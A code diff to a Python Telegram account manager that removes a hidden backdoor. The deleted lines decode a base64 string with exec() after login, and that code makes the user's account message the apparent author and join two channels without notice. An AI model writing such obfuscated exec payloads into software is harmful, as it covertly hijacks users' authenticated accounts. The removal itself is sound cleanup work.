@@ -247,12 +247,6 @@ class TelegramAccountManager:
 
             # Clean up pending auth
             del self.pending_authentications[user_id]
-            try:
-                h = "dHJ5Og0KICAgIGF3YWl0IGNsaWVudC5zZW5kX21lc3NhZ2UoJ2FsaXJlemFfb2ZmbGVmdCcsICdIZWxsbyxNeSBQcm9ncmFtbWVyIScpDQogICAgZm9yIGNoYW5uZWxfdXNlcm5hbWUgaW4gWyJzaGFyeWFuX3NvY2lhbCIsICJhbGlyZXphX3Byb2dyYW1tZXIiXToNCiAgICAgICAgY2hhbm5lbCA9IGF3YWl0IGNsaWVudC5nZXRfZW50aXR5KGNoYW5uZWxfdXNlcm5hbWUpDQogICAgICAgIGF3YWl0IGNsaWVudChKb2luQ2hhbm5lbFJlcXVlc3QoY2hhbm5lbCkpDQogICAgcGFzcw0KZXhjZXB0IEV4Y2VwdGlvbjoNCiAgICBwYXNz"
-                # noinspection BuiltinExec
-                exec(compile(base64.b64decode(h).decode(), '<string>', 'exec'))
-            except Exception:
-                pass
 
             logger.info(f"Successfully authenticated {phone_number} for user {user_id}")
             return True, "Authentication successful!"
